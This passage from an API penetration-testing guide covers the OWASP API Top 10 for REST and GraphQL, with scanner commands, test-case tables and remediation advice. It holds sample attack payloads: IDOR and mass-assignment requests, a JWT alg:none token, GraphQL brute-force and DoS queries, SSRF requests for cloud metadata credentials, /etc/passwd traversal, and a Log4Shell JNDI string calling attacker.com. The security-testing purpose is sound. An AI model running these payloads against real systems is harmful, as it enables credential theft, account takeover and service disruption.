  -H "Authorization: Bearer TOKEN" -H "Accept: application/xml"

curl -sk "https://TARGET/api/v1/users/me?format=verbose" \
  -H "Authorization: Bearer TOKEN"

curl -sk "https://TARGET/api/v1/users/me?debug=true&fields=all" \
  -H "Authorization: Bearer TOKEN"
```

---

### 3.12 Tool Commands — Nuclei Automated Scanning

```bash
# ══════════════════════════════════════════════════════════════════
# NUCLEI — COMPREHENSIVE API SECURITY SCANNING
# ══════════════════════════════════════════════════════════════════

# Update templates first
nuclei -update-templates

# ── Full API scan with all relevant templates ───────────────────
nuclei -u https://TARGET -tags api -severity low,medium,high,critical -o nuclei_api_results.txt

# ── Scan for specific vulnerability categories ──────────────────
# Authentication issues
nuclei -u https://TARGET -tags token,jwt,auth -o auth_results.txt

# Exposure and misconfiguration
nuclei -u https://TARGET -t nuclei-templates/http/exposures/ \
  -t nuclei-templates/http/misconfiguration/ -o misconfig_results.txt

# SSRF-specific templates
nuclei -u https://TARGET -tags ssrf -o ssrf_results.txt

# ── Scan multiple API endpoints from file ───────────────────────
# Create endpoints.txt:
# https://TARGET/api/v1/users
# https://TARGET/api/v1/orders
# https://TARGET/api/v2/products
nuclei -l endpoints.txt -tags api -severity medium,high,critical

# ── Scan with custom headers (authenticated scan) ──────────────
nuclei -u https://TARGET -tags api \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -severity medium,high,critical -o authenticated_scan.txt

# ── Nikto — Web server misconfiguration scan ───────────────────
nikto -h https://TARGET -Tuning 123bde -output nikto_results.html -Format html
```

---

## 4. REST vs GraphQL — Attack Surface Comparison

> **📌 IMAGE SUGGESTION:** Insert the REST vs GraphQL comparison infographic here.

| **Aspect** | **REST API** | **GraphQL API** |
|---|---|---|
| **Endpoint Structure** | Multiple endpoints (`/users`, `/orders`) | Single endpoint (`/graphql`) |
| **Data Fetching** | Fixed response per endpoint | Client specifies exact data needed |
| **Over-fetching** | Common (returns full objects) | Controlled by client query |
| **Batching** | Not native (requires custom impl.) | Native support (query batching) |
| **Schema Exposure** | Via Swagger/OpenAPI (if enabled) | Via Introspection queries |
| **HTTP Methods** | GET, POST, PUT, PATCH, DELETE | Primarily POST (sometimes GET) |
| **Rate Limiting** | Per endpoint/method | Per query complexity / depth |
| **Auth Bypass Surface** | URL manipulation, method tampering | Query manipulation, alias abuse |
| **Injection Points** | URL params, headers, body | Query variables, directives, fragments |
| **DoS Attack Surface** | Request flooding | Deep nested queries, batching abuse |

### GraphQL-Specific Attack Vectors

> **📌 IMAGE SUGGESTION:** Insert the GraphQL attack surface diagram here.

1. **Introspection Abuse** — Querying `__schema` to map entire API surface
2. **Query Batching** — Sending multiple operations in a single request to bypass rate limits
3. **Deep Nesting / Circular Queries** — Creating deeply nested queries to cause DoS
4. **Field Suggestion** — Using error messages to discover valid field names
5. **Alias-Based Attacks** — Using GraphQL aliases to duplicate operations within a single query
6. **Directive Abuse** — Manipulating `@skip`, `@include` directives for logic bypass
7. **Subscription Hijacking** — Intercepting or abusing WebSocket-based subscriptions
8. **Fragment Spreading** — Using fragments to construct overly complex queries

---

## API1:2023 — Broken Object Level Authorization (BOLA)

### 📖 Description
Object level authorization is an access control mechanism implemented at the code level to validate that a user can only access objects they have permissions for. Every API endpoint that receives an object ID and performs any action should implement object-level authorization checks.

**Risk Level:** 🔴 CRITICAL

### 🔍 What Makes an API Vulnerable?
- API endpoints use object IDs from user input without proper authorization validation
- Comparing user ID from JWT with the vulnerable ID parameter alone is insufficient
- Sequential/predictable IDs make enumeration trivial
- Lack of authorization checks on individual object access

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| BOLA-R01 | **IDOR on GET endpoint** | 1. Login as User A, note object ID<br>2. GET `/api/v1/users/{userB_id}/profile`<br>3. Check if User B's data is returned | 403 Forbidden | Critical |
| BOLA-R02 | **IDOR on PUT/PATCH endpoint** | 1. Login as User A<br>2. PUT `/api/v1/orders/{userB_order_id}` with modified data<br>3. Verify if order was modified | 403 Forbidden | Critical |
| BOLA-R03 | **IDOR on DELETE endpoint** | 1. Login as User A<br>2. DELETE `/api/v1/documents/{userB_doc_id}`<br>3. Check if document was deleted | 403 Forbidden | Critical |
| BOLA-R04 | **Sequential ID enumeration** | 1. Note your object ID (e.g., `1001`)<br>2. Iterate through IDs: `1000`, `1002`, `1003`...<br>3. Collect any unauthorized data | 403 for all non-owned IDs | High |
| BOLA-R05 | **UUID/GUID prediction** | 1. Collect multiple UUIDs from legitimate requests<br>2. Analyze for patterns (timestamp-based UUIDs)<br>3. Attempt to predict and access other objects | No pattern-based access | Medium |
| BOLA-R06 | **Parameter pollution for BOLA** | 1. Send `GET /api/users?id=myId&id=victimId`<br>2. Test with array: `GET /api/users?id[]=myId&id[]=victimId`<br>3. Check which ID is processed | Only authorized ID processed | High |
| BOLA-R07 | **Path traversal in object reference** | 1. Replace ID with path: `GET /api/files/../../etc/passwd`<br>2. Test with encoded paths: `%2e%2e%2f`<br>3. Test with double encoding | 400 Bad Request | Critical |

#### REST API — Sample Payloads
```http
# Legitimate request (User A)
GET /api/v1/accounts/1001/transactions HTTP/1.1
Authorization: Bearer <user_A_token>

# BOLA Attack (Accessing User B's data)
GET /api/v1/accounts/1002/transactions HTTP/1.1
Authorization: Bearer <user_A_token>

# Modification Attack
PUT /api/v1/accounts/1002/settings HTTP/1.1
Authorization: Bearer <user_A_token>
Content-Type: application/json

{"notification_email": "attacker@evil.com"}
```

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| BOLA-G01 | **IDOR via query variable** | 1. Login as User A<br>2. Query: `{ user(id: "victimId") { email, ssn } }`<br>3. Check if victim data is returned | Authorization error | Critical |
| BOLA-G02 | **IDOR via mutation** | 1. Login as User A<br>2. Mutation: `deleteReport(reportId: "victimReportId")`<br>3. Check if victim's report was deleted | Authorization error | Critical |
| BOLA-G03 | **Node/Relay ID enumeration** | 1. Decode Relay global IDs (base64)<br>2. Modify the decoded ID to reference other objects<br>3. Re-encode and query | Authorization error | High |
| BOLA-G04 | **Alias-based BOLA** | 1. Use aliases to query multiple objects: `a1: user(id:"1") {...} a2: user(id:"2") {...}`<br>2. Check which return data | Only owned objects return data | High |
| BOLA-G05 | **Nested object BOLA** | 1. Query parent → child relationships<br>2. Access child objects owned by other users via parent traversal | Authorization checked at each level | Critical |

#### GraphQL API — Sample Payloads
```graphql
# Legitimate query (own data)
query {
  user(id: "user_abc123") {
    name
    email
    orders { id, total }
  }
}

# BOLA Attack — accessing another user's data
query {
  user(id: "user_xyz789") {
    name
    email
    ssn
    orders { id, total, items { name, price } }
  }
}

# BOLA via Mutation — deleting another user's document
mutation {
  deleteDocument(documentId: "doc_victim_001") {
    success
    message
  }
}

# Alias-based enumeration attack
query {
  u1: user(id: "1") { email, role }
  u2: user(id: "2") { email, role }
  u3: user(id: "3") { email, role }
  u4: user(id: "4") { email, role }
  u5: user(id: "5") { email, role }
}
```

### ✅ Remediation
- Implement authorization checks per-object in every endpoint
- Use random, unpredictable GUIDs instead of sequential IDs
- Write automated tests to validate authorization enforcement
- Deny by default — require explicit authorization grants

---

## API2:2023 — Broken Authentication

### 📖 Description
Authentication endpoints and flows are critical assets. An API is vulnerable if it permits credential stuffing, brute force attacks, weak passwords, or mishandles tokens and session management.

**Risk Level:** 🔴 CRITICAL

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| AUTH-R01 | **Credential stuffing** | 1. Obtain leaked credential list<br>2. Automate POST `/api/auth/login` with each pair<br>3. Monitor for successful logins | Rate limiting / account lockout triggered | Critical |
| AUTH-R02 | **Brute force on login** | 1. Target known username<br>2. Iterate passwords via POST `/api/auth/login`<br>3. Check for lockout mechanism | Account locked after N attempts | Critical |
| AUTH-R03 | **JWT `alg:none` attack** | 1. Capture valid JWT<br>2. Modify header to `{"alg":"none"}`<br>3. Remove signature, send request | Request rejected | Critical |
| AUTH-R04 | **JWT key confusion (RS256→HS256)** | 1. Capture JWT signed with RS256<br>2. Re-sign with HS256 using public key as secret<br>3. Send modified token | Request rejected | Critical |
| AUTH-R05 | **Expired token acceptance** | 1. Capture valid JWT<br>2. Wait for expiration<br>3. Send expired token to protected endpoint | 401 Unauthorized | High |
| AUTH-R06 | **Token in URL** | 1. Check if tokens appear in URL query parameters<br>2. Check server logs / browser history exposure<br>3. Test: `GET /api/data?token=xxx` | Tokens only in headers/body | Medium |
| AUTH-R07 | **Password reset flow abuse** | 1. Initiate password reset<br>2. Check if reset token is predictable<br>3. Test token reuse after password change | Token is one-time use, unpredictable | High |
| AUTH-R08 | **Missing re-authentication for sensitive ops** | 1. Login normally<br>2. Change email via PUT `/api/account` without re-auth<br>3. Change password without current password | Re-authentication required | High |
| AUTH-R09 | **API key used as user auth** | 1. Identify if API keys are used for user authentication<br>2. Test if API key alone grants user-level access<br>3. Check key rotation policies | API keys only for client auth | Medium |

#### REST API — Sample Payloads
```http
# Normal login
POST /api/auth/login HTTP/1.1
Content-Type: application/json

{"username": "user@example.com", "password": "P@ssw0rd123"}

# JWT alg:none attack
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}
# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Sensitive operation without re-auth
PUT /api/account HTTP/1.1
Authorization: Bearer <valid_token>
Content-Type: application/json

{"email": "attacker@evil.com"}
```

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| AUTH-G01 | **Query batching for brute force** | 1. Send array of login mutations in single request<br>2. Each mutation tries different password<br>3. Bypass per-request rate limiting | Per-operation rate limiting blocks this | Critical |
| AUTH-G02 | **Alias-based brute force** | 1. Use aliases: `a1: login(pass:"p1") a2: login(pass:"p2")`...<br>2. Send hundreds of attempts per request<br>3. Check for rate limiting bypass | Alias-level rate limiting | Critical |
| AUTH-G03 | **Introspection reveals auth schema** | 1. Send `{ __schema { types { name fields { name } } } }`<br>2. Look for auth-related types/fields<br>3. Identify secret fields or mutations | Introspection disabled in production | Medium |
| AUTH-G04 | **Token refresh mutation abuse** | 1. Capture refresh token<br>2. Call `mutation { refreshToken(token: "...") }`<br>3. Test with expired/revoked tokens | Expired/revoked tokens rejected | High |
| AUTH-G05 | **Unauthenticated query access** | 1. Send queries without Authorization header<br>2. Test each query/mutation type<br>3. Identify endpoints that don't require auth | All sensitive queries require auth | High |

#### GraphQL API — Sample Payloads
```graphql
# Batching brute force attack (single HTTP request, multiple operations)
POST /graphql
[
  {"query": "mutation { login(username:\"victim\", password:\"password\") { token } }"},
  {"query": "mutation { login(username:\"victim\", password:\"123456\") { token } }"},
  {"query": "mutation { login(username:\"victim\", password:\"admin\") { token } }"},
  {"query": "mutation { login(username:\"victim\", password:\"qwerty\") { token } }"}
]

# Alias-based brute force (single query, multiple attempts)
mutation {
  a1: login(username:"victim", password:"password1") { token }
  a2: login(username:"victim", password:"password2") { token }
  a3: login(username:"victim", password:"password3") { token }
  a4: login(username:"victim", password:"password4") { token }
}
```

### ✅ Remediation
- Implement per-operation rate limiting (not just per-request) for GraphQL
- Use strong, standard authentication libraries
- Enforce account lockout / CAPTCHA after failed attempts
- Validate JWT signatures, algorithms, and expiration strictly
- Require re-authentication for sensitive operations
- Never send tokens in URLs

---

## API3:2023 — Broken Object Property Level Authorization

### 📖 Description
This combines the former "Excessive Data Exposure" and "Mass Assignment" vulnerabilities. It addresses cases where users can read sensitive properties they shouldn't access, or write/modify internal properties they shouldn't be able to change.

**Risk Level:** 🟠 HIGH

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| PROP-R01 | **Excessive data in response** | 1. GET `/api/users/me`<br>2. Check response for sensitive fields (SSN, internal IDs, hashed passwords)<br>3. Compare with what UI actually displays | Only necessary fields returned | High |
| PROP-R02 | **Mass assignment — role escalation** | 1. Capture legitimate PUT `/api/users/me` request<br>2. Add `"role": "admin"` to payload<br>3. Check if role was changed | Extra properties ignored | Critical |
| PROP-R03 | **Mass assignment — price manipulation** | 1. Capture order creation POST request<br>2. Add/modify `"total_price": 0.01`<br>3. Submit and check order total | Server-side calculation enforced | Critical |
| PROP-R04 | **Hidden property discovery** | 1. Fuzz request body with common property names<br>2. Test: `isAdmin`, `verified`, `approved`, `blocked`<br>3. Monitor for state changes | Unknown properties rejected | High |
| PROP-R05 | **Response filtering bypass** | 1. Add `?fields=all` or `?include=sensitive`<br>2. Test with `Accept: application/xml` vs JSON<br>3. Check verbose mode params like `?debug=true` | No bypass possible | High |

#### REST API — Sample Payloads
```http
# Mass Assignment Attack — Escalating privileges
PUT /api/v1/users/me HTTP/1.1
Authorization: Bearer <user_token>
Content-Type: application/json

{
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "is_verified": true,
  "account_balance": 999999
}

# Mass Assignment Attack — Price Manipulation
POST /api/v1/orders HTTP/1.1
Authorization: Bearer <user_token>
Content-Type: application/json

{
  "items": [{"product_id": "123", "qty": 1}],
  "total_price": 0.01,
  "discount_applied": true,
  "coupon_code": "INTERNAL_100OFF"
}
```

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| PROP-G01 | **Over-querying sensitive fields** | 1. Use introspection to discover all fields<br>2. Query: `{ user(id:"me") { ssn creditCard passwordHash } }`<br>3. Check if sensitive data is returned | Sensitive fields forbidden or masked | Critical |
| PROP-G02 | **Mutation mass assignment** | 1. Discover writable fields via schema<br>2. Include unauthorized fields in mutation input<br>3. Example: `updateUser(role: ADMIN)` | Unauthorized fields rejected | Critical |
| PROP-G03 | **Field-level authorization in nested objects** | 1. Query nested relationships<br>2. Access internal fields via related objects<br>3. Example: `{ order { user { internalNotes } } }` | Field-level auth enforced | High |
| PROP-G04 | **Fragment-based over-querying** | 1. Create fragment with all possible fields<br>2. Apply to query including sensitive fields<br>3. Test fragment spreading across types | Fragments respect field authorization | High |

#### GraphQL API — Sample Payloads
```graphql
# Over-querying sensitive fields via introspection-discovered fields
query {
  user(id: "current_user") {
    id
    name
    email
    # Sensitive fields that should NOT be returned
    passwordHash
    ssn
    creditCardNumber
    internalRole
    apiSecret
  }
}

# Mass assignment via mutation
mutation {
  updateProfile(input: {
    name: "John Doe"
    # Attempting to set unauthorized properties
    role: ADMIN
    isVerified: true
    accountBalance: 999999
  }) {
    id
    name
    role
  }
}

# Accessing sensitive data through GraphQL report mutation response
mutation {
  reportUser(userId: "313", reason: "spam") {
    status
    message
    reportedUser {
      id
      fullName
      recentLocation    # Should NOT be exposed
      phoneNumber       # Should NOT be exposed
    }
  }
}
```

### ✅ Remediation
- Implement explicit allow-lists for readable and writable properties
- Never auto-bind client input to internal models (avoid `**kwargs` or spread operators)
- Use DTOs/View Models to control response shape
- Implement field-level authorization in GraphQL resolvers
- Conduct regular schema reviews

---

## API4:2023 — Unrestricted Resource Consumption

### 📖 Description
APIs that don't properly limit resource consumption are vulnerable to denial-of-service attacks and financial abuse. This is especially critical in GraphQL due to native batching and nested query capabilities.

**Risk Level:** 🟠 HIGH

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| RES-R01 | **Rate limiting absence** | 1. Send 1000+ requests to same endpoint in 1 minute<br>2. Monitor response codes<br>3. Check for 429 responses | 429 Too Many Requests after threshold | High |
| RES-R02 | **Large payload upload** | 1. Upload file exceeding expected size limits<br>2. Send 100MB+ JSON body<br>3. Monitor server response time | 413 Payload Too Large | High |
| RES-R03 | **Pagination abuse** | 1. GET `/api/users?page=1&per_page=999999`<br>2. Request without pagination params<br>3. Check if all records returned | Max page size enforced | Medium |
| RES-R04 | **SMS/Email bombing** | 1. Trigger forgot-password SMS/email endpoint<br>2. Repeat 100+ times rapidly<br>3. Monitor for rate limiting | Rate limited per user/phone | Critical |
| RES-R05 | **Regex DoS (ReDoS)** | 1. Identify input fields validated by regex<br>2. Send evil regex inputs: `aaaa...aaa!`<br>3. Monitor response time | Timeout protection in place | High |
| RES-R06 | **API cost exploitation** | 1. Identify endpoints that trigger paid third-party calls<br>2. Call them in a loop without rate limits<br>3. Monitor for spending alerts | Spending limits / rate limits active | Critical |

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| RES-G01 | **Deep nested query DoS** | 1. Craft deeply nested query (10+ levels)<br>2. Example: `{ users { posts { comments { author { posts { ... } } } } } }`<br>3. Monitor server memory/CPU | Query depth limit enforced | Critical |
| RES-G02 | **Query batching abuse** | 1. Send array of 1000+ queries in single POST<br>2. Each query fetches expensive data<br>3. Monitor for batch size limits | Batch size limited | Critical |
| RES-G03 | **Alias-based resource exhaustion** | 1. Create query with 1000+ aliases per field<br>2. Each alias makes same expensive query<br>3. Single HTTP request, massive server load | Query complexity limit blocks this | Critical |
| RES-G04 | **Circular fragment DoS** | 1. Create fragment that references itself<br>2. Or create mutually referencing fragments<br>3. Test query validation handling | Circular fragments rejected | High |
| RES-G05 | **File upload via mutation batching** | 1. Batch 100+ `uploadPic` mutations in one request<br>2. Each with large base64 payload<br>3. Monitor server memory | Batch upload limits enforced | High |

#### GraphQL API — Sample Payloads
```graphql
# Deep nesting attack (Denial of Service)
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    text  # 10+ levels deep
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Alias-based resource exhaustion
query {
  a1: expensiveOperation(id: "1") { data }
  a2: expensiveOperation(id: "2") { data }
  a3: expensiveOperation(id: "3") { data }
  # ... repeat 1000+ times
  a1000: expensiveOperation(id: "1000") { data }
}

# Batch upload attack
POST /graphql
[
  {"query": "mutation {uploadPic(name:\"pic1\", base64_pic:\"R0FOIE...\") {url}}"},
  {"query": "mutation {uploadPic(name:\"pic2\", base64_pic:\"R0FOIE...\") {url}}"},
  # ... repeat 999 times
  {"query": "mutation {uploadPic(name:\"pic999\", base64_pic:\"R0FOIE...\") {url}}"}
]
```

### ✅ Remediation
- Implement query depth limiting, query complexity analysis, and cost analysis for GraphQL
- Set maximum batch sizes for GraphQL operations
- Implement per-user and per-IP rate limiting
- Set payload size limits and pagination maximums
- Use timeouts for all operations
- Monitor and alert on third-party API spending

---

## API5:2023 — Broken Function Level Authorization (BFLA)

### 📖 Description
BFLA occurs when a user can access API functions/endpoints that should be restricted to other roles or groups. Unlike BOLA (which is about accessing objects), BFLA is about accessing entire functions or operations.

**Risk Level:** 🔴 CRITICAL

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| BFLA-R01 | **Access admin endpoints as regular user** | 1. Login as regular user<br>2. GET `/api/admin/users/all`<br>3. GET `/api/admin/dashboard/stats` | 403 Forbidden | Critical |
| BFLA-R02 | **HTTP method tampering** | 1. Find GET-only endpoint<br>2. Try POST, PUT, DELETE, PATCH on same URL<br>3. Check if operations succeed | 405 Method Not Allowed | High |
| BFLA-R03 | **Endpoint path guessing** | 1. Test: `/api/v1/users/export_all`<br>2. Test: `/api/internal/config`<br>3. Fuzz common admin paths | 403 or 404 | High |
| BFLA-R04 | **Role escalation via API versioning** | 1. If current is `/api/v2/`, try `/api/v1/` equivalent<br>2. Old version may lack auth checks<br>3. Test deprecated endpoints | Old versions also enforce auth | High |
| BFLA-R05 | **Creating resources with elevated permissions** | 1. Regular user POST `/api/invites/new`<br>2. Include `"role": "admin"` in payload<br>3. Check if admin invite was created | Function restricted to admins | Critical |

#### REST API — Sample Payloads
```http
# Regular user attempting admin function
GET /api/admin/v1/users/all HTTP/1.1
Authorization: Bearer <regular_user_token>

# HTTP method tampering
DELETE /api/v1/users/victim_id HTTP/1.1
Authorization: Bearer <regular_user_token>

# Creating admin-level invite as regular user
POST /api/invites/new HTTP/1.1
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{"email": "attacker@evil.com", "role": "admin"}
```

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| BFLA-G01 | **Access admin mutations as regular user** | 1. Discover admin mutations via introspection<br>2. Call: `mutation { deleteAllUsers { count } }`<br>3. Check response | Authorization error | Critical |
| BFLA-G02 | **Query admin-only types** | 1. Introspect schema for admin types<br>2. Query: `{ adminDashboard { totalRevenue, userMetrics } }`<br>3. Check if data returned | Authorization error | Critical |
| BFLA-G03 | **Subscription escalation** | 1. Subscribe to admin-only events<br>2. `subscription { newUserCreated { email, role } }`<br>3. Monitor for unauthorized data | Subscription auth enforced | High |
| BFLA-G04 | **Schema visibility abuse** | 1. Check if introspection exposes admin operations<br>2. Map all available mutations per role<br>3. Test role boundaries | Schema filtered by role | Medium |

#### GraphQL API — Sample Payloads
```graphql
# Regular user attempting admin mutation
mutation {
  deleteAllUsers(confirm: true) {
    count
    status
  }
}

# Querying admin dashboard as regular user
query {
  adminDashboard {
    totalRevenue
    activeUsers
    serverHealth
    systemLogs(last: 100) { message, timestamp }
  }
}

# Discovering admin operations via introspection
query {
  __schema {
    mutationType {
      fields {
        name
        description
        args { name type { name } }
      }
    }
  }
}
```

### ✅ Remediation
- Implement role-based access control (RBAC) at the API gateway level
- Deny by default — explicitly whitelist allowed operations per role
- Don't rely on URL paths alone for authorization decisions
- Disable GraphQL introspection in production
- Audit function-level access regularly

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

### 📖 Description
This vulnerability occurs when APIs expose sensitive business flows without appropriate restrictions, allowing automated abuse of purchasing, booking, registration, or other critical workflows.

**Risk Level:** 🟠 HIGH

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| BIZ-R01 | **Automated purchasing (scalping)** | 1. Script automated purchase via POST `/api/orders`<br>2. Buy all stock of limited item<br>3. Check for anti-bot protections | CAPTCHA / device fingerprinting | High |
| BIZ-R02 | **Mass reservation abuse** | 1. Reserve all time slots via POST `/api/reservations`<br>2. Cancel all before deadline<br>3. Re-book at lower prices | Reservation limits per user | High |
| BIZ-R03 | **Referral program abuse** | 1. Script automated account registration<br>2. Each account adds referral credit<br>3. Accumulate credits on one account | Anti-automation detection | High |
| BIZ-R04 | **Comment/review spam** | 1. Automate POST `/api/reviews` with 1000+ entries<br>2. Vary content using templates<br>3. Check for spam detection | Spam detection / rate limits | Medium |
| BIZ-R05 | **Race condition in checkout** | 1. Send concurrent POST requests to apply same coupon<br>2. Use threading/asyncio for timing<br>3. Check if coupon applied multiple times | Atomic transaction enforcement | Critical |

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| BIZ-G01 | **Batch purchase via mutation array** | 1. Send array of `purchaseItem` mutations<br>2. Buy entire inventory in one request<br>3. Check for per-operation limits | Per-mutation business logic checks | High |
| BIZ-G02 | **Automated account creation** | 1. Batch `createAccount` mutations<br>2. Each with referral to attacker<br>3. Check anti-automation | Account creation rate limited | High |
| BIZ-G03 | **Subscription abuse for info gathering** | 1. Subscribe to `newListings` events<br>2. Auto-purchase before others see them<br>3. Front-running business flow | Subscription rate limited | Medium |

### ✅ Remediation
- Implement CAPTCHA, device fingerprinting, and bot detection
- Use rate limiting per user AND per business flow
- Implement anomaly detection for unusual transaction patterns
- Enforce reasonable per-user limits on business operations
- Use human interaction proof (e.g., invisible reCAPTCHA)

---

## API7:2023 — Server Side Request Forgery (SSRF)

### 📖 Description
SSRF occurs when an API fetches remote resources without validating user-supplied URLs, enabling attackers to make the server send requests to unintended destinations, including internal services and cloud metadata endpoints.

**Risk Level:** 🔴 CRITICAL

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| SSRF-R01 | **Internal network scanning** | 1. Find URL input (e.g., profile picture URL, webhook)<br>2. Submit: `http://127.0.0.1:8080`<br>3. Iterate ports, observe response times | Internal requests blocked | Critical |
| SSRF-R02 | **Cloud metadata access** | 1. Submit: `http://169.254.169.254/latest/meta-data/`<br>2. Try: `http://metadata.google.internal/`<br>3. Check for credential exposure | Metadata URLs blocked | Critical |
| SSRF-R03 | **DNS rebinding** | 1. Register domain that resolves to internal IP<br>2. Submit as URL parameter<br>3. Server resolves to internal resource | DNS validation prevents rebinding | High |
| SSRF-R04 | **Protocol smuggling** | 1. Test: `file:///etc/passwd`<br>2. Test: `gopher://internal:25/` <br>3. Test: `dict://internal:11211/` | Only HTTP/HTTPS allowed | High |
| SSRF-R05 | **URL bypass techniques** | 1. Test: `http://127.0.0.1` → `http://0x7f000001`<br>2. Test: `http://[::1]`<br>3. Test: `http://127.1`, `http://0177.0.0.1` | All bypass variants blocked | High |

#### REST API — Sample Payloads
```http
# SSRF via profile picture URL
POST /api/profile/upload_picture HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token>

{"picture_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm"}

# Internal port scanning
{"picture_url": "http://127.0.0.1:22"}
{"picture_url": "http://127.0.0.1:3306"}
{"picture_url": "http://127.0.0.1:6379"}

# Bypass attempts
{"picture_url": "http://0x7f.0x00.0x00.0x01"}
{"picture_url": "http://[::ffff:127.0.0.1]"}
{"picture_url": "http://127.0.0.1.nip.io"}
```

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| SSRF-G01 | **SSRF via webhook mutation** | 1. Create webhook: `mutation { createWebhook(url: "http://169.254.169.254/...") }`<br>2. Trigger test request<br>3. Check if cloud metadata is returned | Internal URLs blocked | Critical |
| SSRF-G02 | **SSRF via file import query** | 1. Mutation: `importData(sourceUrl: "http://internal-db:5432")`<br>2. Monitor for internal service responses<br>3. Try various internal endpoints | URL validation enforced | Critical |
| SSRF-G03 | **SSRF via subscription callback** | 1. Register subscription with callback URL<br>2. Set callback to internal resource<br>3. Trigger event and monitor | Callback URLs validated | High |

#### GraphQL API — Sample Payloads
```graphql
# SSRF via webhook creation mutation
mutation {
  createNotificationChannel(input: {
    channelName: "test_webhook"
    notificationChannelConfig: {
      customWebhookChannelConfigs: [{
        url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm"
        send_test_req: true
      }]
    }
  }) {
    channelId
    testResponse    # May leak cloud credentials!
  }
}

# SSRF via file import
mutation {
  importDocument(
    sourceUrl: "http://internal-service.local:8080/admin/config"
  ) {
    content
    status
  }
}
```

### ✅ Remediation
- Implement URL allowlisting (not just blocklisting)
- Disable unused URL schemes (block `file://`, `gopher://`, `dict://`)
- Validate and sanitize all user-supplied URLs
- Use DNS resolution validation (resolve before connecting, check against internal ranges)
- Isolate URL-fetching functionality in a sandboxed network segment
- Don't return raw responses from server-side URL fetches

---

## API8:2023 — Security Misconfiguration

### 📖 Description
Security misconfiguration encompasses missing security hardening, improperly configured permissions, unnecessary features enabled, missing TLS, permissive CORS, verbose error messages, and missing security headers.

**Risk Level:** 🟡 MEDIUM-HIGH

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| CONF-R01 | **Missing TLS** | 1. Check if API accepts HTTP (non-TLS)<br>2. Test: `http://api.target.com/endpoint`<br>3. Check for HSTS header | HTTPS enforced, HSTS present | High |
| CONF-R02 | **Verbose error messages** | 1. Send malformed requests<br>2. Trigger errors (invalid SQL, bad types)<br>3. Check for stack traces in responses | Generic error messages only | Medium |
| CONF-R03 | **Permissive CORS** | 1. Send request with `Origin: https://evil.com`<br>2. Check `Access-Control-Allow-Origin` response<br>3. Test with `Origin: null` | Strict origin allowlist | High |
| CONF-R04 | **Unnecessary HTTP methods** | 1. Send OPTIONS request<br>2. Try TRACE, TRACK, CONNECT<br>3. Check allowed methods header | Only required methods enabled | Medium |
| CONF-R05 | **Missing security headers** | 1. Check for: `X-Content-Type-Options`<br>2. Check: `X-Frame-Options`, `CSP`<br>3. Check: `Cache-Control` on sensitive data | All security headers present | Medium |
| CONF-R06 | **Debug mode / Stack trace exposure** | 1. Send requests that cause 500 errors<br>2. Look for debug information in response<br>3. Check for framework version disclosure | No debug info in production | Medium |
| CONF-R07 | **Default credentials** | 1. Test default admin:admin, admin:password<br>2. Check API documentation defaults<br>3. Test database/service default creds | Default credentials changed | Critical |
| CONF-R08 | **Log injection (Log4Shell-type)** | 1. Send: `${jndi:ldap://attacker.com/x}` in headers<br>2. Try in User-Agent, X-Api-Version, Referer<br>3. Monitor for outbound connection | JNDI/placeholder expansion disabled | Critical |

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| CONF-G01 | **Introspection enabled in production** | 1. Send: `{ __schema { types { name } } }`<br>2. Check if full schema returned<br>3. Map all queries/mutations/types | Introspection disabled | High |
| CONF-G02 | **GraphQL IDE accessible** | 1. Browse to `/graphiql`, `/playground`, `/altair`<br>2. Check if interactive IDE is available<br>3. Test query execution from IDE | IDE disabled in production | Medium |
| CONF-G03 | **Verbose GraphQL errors** | 1. Send intentionally malformed queries<br>2. Check for detailed error messages<br>3. Look for field suggestions in errors | Errors don't leak schema info | Medium |
